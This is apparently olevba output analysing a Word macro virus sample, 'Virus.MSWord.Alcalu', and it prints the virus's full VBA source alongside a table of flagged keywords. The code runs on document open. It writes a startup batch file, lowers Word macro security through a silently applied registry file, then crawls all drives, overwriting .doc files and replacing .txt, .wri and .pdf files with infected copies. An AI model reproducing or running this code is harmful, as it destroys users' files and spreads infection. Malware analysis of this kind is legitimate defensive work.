olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Alcalu
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO dr_alco.cls 
in file: Virus.MSWord.Alcalu - OLE stream: 'Macros/VBA/dr_alco'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub document_open()
On Error Resume Next
Dim fso, f
Open "c:\windows\startm~1\programs\startup\winword.bat" For Output As 1
Print #1, "@echo off"
Print #1, "ctty null"
Print #1, ":: MS Word needs this file.. Don't attempt to delete it"
Print #1, "regedit /s c:\windows\winword.reg"
Print #1, "start c:\windows\normal.doc"
Close 1
Open "c:\windows\winword.reg" For Output As 2
Print #2, "REGEDIT4"
Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
Print #2, """Level""=dword:00000001"
Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"
Print #2, """Level""=dword:00000001"
Print #2, """AccessVBOM""=dword:00000001"
Close 2
Shell "regedit /s c:\windows\winword.reg", vbHide
Call haha
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.GetFile(ActiveDocument.FullName)
f.Copy ("c:\windows\normal.doc")
Set b = Assistant.NewBalloon
With b
    .Heading = "Whew!!"
    .Text = "Wassup, doc? You have so many document files in your hard drive.. Better remove some.."
    returnValue = .Show
End With
End Sub
'Technology borrowed from a notorious worm... Retouched and put into good use
Sub haha()
  On Error Resume Next
  Dim d, dc, s, fso, haha
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set dc = fso.Drives
  For Each d In dc
    If d.DriveType = 2 Or d.DriveType = 3 Then
      hihi (d.Path & "\")
    End If
  Next
  haha = s
End Sub
Sub hehe(folderspec)
  On Error Resume Next
  Dim f, f1, fc, ext, s, fso
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set f = fso.GetFolder(folderspec)
  Set fc = f.Files
  For Each f1 In fc
    ext = fso.GetExtensionName(f1.Path)
    ext = LCase(ext)
    s = LCase(f1.Name)
   If (ext = "doc") Then
   Set f = fso.GetFile(ActiveDocument.FullName)
   f.Copy (f1.Path)
   ElseIf (ext = "txt") Or (ext = "wri") Or (ext = "pdf") Then
   Set f = fso.GetFile(ActiveDocument.FullName)
   f.Copy (f1.Path & ".doc")
   fso.DeleteFile (f1.Path)
   End If
Next
End Sub
Sub hihi(folderspec)
  On Error Resume Next
  Dim f, f1, sf, fso
    Set fso = CreateObject("Scripting.FileSystemObject")
  Set f = fso.GetFolder(folderspec)
  Set sf = f.SubFolders
  For Each f1 In sf
    hehe (f1.Path)
    hihi (f1.Path)
  Next
End Sub
'DOC / Doctor by alcopaul
'the 1st, i think (correct me if i'm wrong), stand-alone document virus...
'concept proven
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |winword.bat         |Executable file name                         |
|IOC       |winword.reg         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

